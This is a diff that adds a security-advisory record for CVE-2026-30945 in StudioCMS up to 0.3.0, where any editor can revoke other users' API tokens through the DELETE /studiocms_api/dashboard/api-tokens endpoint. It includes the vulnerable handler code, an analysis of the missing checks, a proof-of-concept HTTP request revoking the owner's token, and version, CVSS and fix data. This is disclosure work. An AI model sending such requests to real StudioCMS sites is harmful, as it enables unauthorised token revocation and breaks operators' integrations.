@@ -1,0 +1,180 @@
+advisory_id: GHSA-8rgj-vrfr-6hqr
+datasource_id: github_osv/GHSA-8rgj-vrfr-6hqr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-8rgj-vrfr-6hqr/GHSA-8rgj-vrfr-6hqr.json
+aliases:
+  - CVE-2026-30945
+summary: |
+  StudioCMS: IDOR — Arbitrary API Token Revocation Leading to Denial of Service
+  ## Summary
+  The DELETE /studiocms_api/dashboard/api-tokens endpoint allows any authenticated user with editor privileges or above to revoke API tokens belonging to any other user, including admin and owner accounts. The handler accepts tokenID and userID directly from the request payload without verifying token ownership, caller identity, or role hierarchy. This enables targeted denial of service against critical integrations and automations.
+
+  ## Details
+  #### Vulnerable Code
+  The following is the server-side handler for the `DELETE /studiocms_api/dashboard/api-tokens` endpoint (`revokeApiToken`):
+
+  **File:** packages/studiocms/frontend/pages/studiocms_api/dashboard/api-tokens.ts (lines 58–99)
+  **Version:** studiocms@0.3.0
+  ```
+  DELETE: (ctx) =>
+      genLogger('studiocms/routes/api/dashboard/api-tokens.DELETE')(function* () {
+          const sdk = yield* SDKCore;
+
+          // Check if demo mode is enabled
+          if (developerConfig.demoMode !== false) {
+              return apiResponseLogger(403, 'Demo mode is enabled, this action is not allowed.');
+          }
+
+          // Get user data
+          const userData = ctx.locals.StudioCMS.security?.userSessionData;       // [1]
+
+          // Check if user is logged in
+          if (!userData?.isLoggedIn) {                                            // [2]
+              return apiResponseLogger(403, 'Unauthorized');
+          }
+
+          // Check if user has permission
+          const isAuthorized = ctx.locals.StudioCMS.security?.userPermissionLevel.isEditor;  // [3]
+          if (!isAuthorized) {
+              return apiResponseLogger(403, 'Unauthorized');
+          }
+
+          // Get Json Data
+          const jsonData = yield* readAPIContextJson<{
+              tokenID: string;                                                    // [4]
+              userID: string;                                                     // [5]
+          }>(ctx);
+
+          // Validate form data
+          if (!jsonData.tokenID) {
+              return apiResponseLogger(400, 'Invalid form data, tokenID is required');
+          }
+
+          if (!jsonData.userID) {
+              return apiResponseLogger(400, 'Invalid form data, userID is required');
+          }
+
+          // [6] Both user-controlled values passed directly — no ownership or identity checks
+          yield* sdk.REST_API.tokens.delete({ tokenId: jsonData.tokenID, userId: jsonData.userID });
+
+          return apiResponseLogger(200, 'Token deleted');                         // [7]
+      }),
+  ```
+  **Analysis**
+  The handler shares the same class of authorization flaws found in the token generation endpoint, applied to a destructive operation:
+  1. **Insufficient permission gate [1][2][3]:** The handler retrieves the session from ctx.locals.StudioCMS.security and only checks isEditor. Token revocation is a high-privilege operation that should require ownership of the token or elevated administrative privileges — not a generic editor-level gate.
+  2. **No token ownership validation [4][6]:** The handler does not verify that jsonData.tokenID actually belongs to the jsonData.userID supplied in the payload. An attacker could enumerate or guess token IDs and revoke them regardless of ownership.
+  3. **Missing caller identity check [5][6]:** The jsonData.userID from the payload is never compared against userData (the authenticated caller from [1]). Any editor can specify an arbitrary target user UUID and revoke their tokens.
+  4. **No role hierarchy enforcement [6]:** There is no check preventing a lower-privileged user (editor) from revoking tokens belonging to higher-privileged accounts (admin, owner).
+  5. **Direct pass-through to destructive operation [6][7]:** Both user-controlled parameters are passed directly to sdk.REST_API.tokens.delete() without any server-side validation, and the server responds with a generic success message, making this a textbook IDOR.
+
+  ## PoC
+  **Environment**
+  *User ID | Role*
+  2450bf33-0135-4142-80be-9854f9a5e9f1 | owner
+  39b3e7d3-5eb0-48e1-abdc-ce95a57b212c | editor
+
+  **Attack — Editor Revokes Owner's API Token**
+  An authenticated editor sends the following request to revoke a token belonging to the owner:
+  ```
+  DELETE /studiocms_api/dashboard/api-tokens HTTP/1.1
+  Host: 127.0.0.1:4321
+  Cookie: auth_session=<editor_session_cookie>
+  Content-Type: application/json
+  Accept: application/json
+  Content-Length: 98
+
+  {
+    "tokenID": "16a2e549-513b-40ac-8ca3-858af6118afc",
+    "userID": "2450bf33-0135-4142-80be-9854f9a5e9f1"
+  }
+  ```
+
+  **Response (HTTP 200):**
+  ```
+  {"message":"Token deleted"}
+  ```
+  The server confirmed deletion of the owner's token. The tokenID here refers to the internal token record identifier (UUID), not the JWT value itself. The editor's session cookie was sufficient to authorize this destructive action against a higher-privileged user.
+
+  ## Impact
+  - **Denial of Service on integrations:** API tokens used in CI/CD pipelines, third-party integrations, or monitoring systems can be silently revoked, causing automated workflows to fail without warning.
+  - **No audit trail:** The revocation is processed as a legitimate operation — the only evidence is the editor's own session, making attribution difficult without detailed request logging.
+impacted_packages:
+  - purl: pkg:github/withstudiocms/studiocms
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/withstudiocms/studiocms
+        commit: 9eec9c3b45523b635cfe16d55aa55afabacbebe3
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/studiocms
+    affected_versions: vers:npm/<=0.3.0
+    fixed_versions: vers:npm/0.4.0
+    affected_packages:
+      - pkg:npm/studiocms@0.1.0-beta.5
+      - pkg:npm/studiocms@0.1.0-beta.6
+      - pkg:npm/studiocms@0.1.0-beta.7
+      - pkg:npm/studiocms@0.1.0-beta.8
+      - pkg:npm/studiocms@0.1.0-beta.9
+      - pkg:npm/studiocms@0.1.0-beta.10
+      - pkg:npm/studiocms@0.1.0-beta.11
+      - pkg:npm/studiocms@0.1.0-beta.12
+      - pkg:npm/studiocms@0.1.0-beta.13
+      - pkg:npm/studiocms@0.1.0-beta.14
+      - pkg:npm/studiocms@0.1.0-beta.15
+      - pkg:npm/studiocms@0.1.0-beta.16
+      - pkg:npm/studiocms@0.1.0-beta.17
+      - pkg:npm/studiocms@0.1.0-beta.18
+      - pkg:npm/studiocms@0.1.0-beta.19
+      - pkg:npm/studiocms@0.1.0-beta.20
+      - pkg:npm/studiocms@0.1.0-beta.21
+      - pkg:npm/studiocms@0.1.0-beta.22
+      - pkg:npm/studiocms@0.1.0-beta.23
+      - pkg:npm/studiocms@0.1.0-beta.24
+      - pkg:npm/studiocms@0.1.0-beta.25
+      - pkg:npm/studiocms@0.1.0-beta.26
+      - pkg:npm/studiocms@0.1.0-beta.27
+      - pkg:npm/studiocms@0.1.0-beta.28
+      - pkg:npm/studiocms@0.1.0-beta.29
+      - pkg:npm/studiocms@0.1.0-beta.30
+      - pkg:npm/studiocms@0.1.0-beta.31
+      - pkg:npm/studiocms@0.1.0
+      - pkg:npm/studiocms@0.1.1
+      - pkg:npm/studiocms@0.2.0
+      - pkg:npm/studiocms@0.3.0
+    fixed_packages:
+      - pkg:npm/studiocms@0.4.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-8rgj-vrfr-6hqr/GHSA-8rgj-vrfr-6hqr.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-639
+references:
+  - url: https://github.com/withstudiocms/studiocms
+    reference_type:
+    reference_id:
+  - url: https://github.com/withstudiocms/studiocms/commit/9eec9c3b45523b635cfe16d55aa55afabacbebe3
+    reference_type:
+    reference_id:
+  - url: https://github.com/withstudiocms/studiocms/releases/tag/studiocms@0.4.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-30945
+    reference_type:
+    reference_id: CVE-2026-30945
+  - url: https://github.com/withstudiocms/studiocms/security/advisories/GHSA-8rgj-vrfr-6hqr
+    reference_type:
+    reference_id: GHSA-8rgj-vrfr-6hqr
+exploits: []
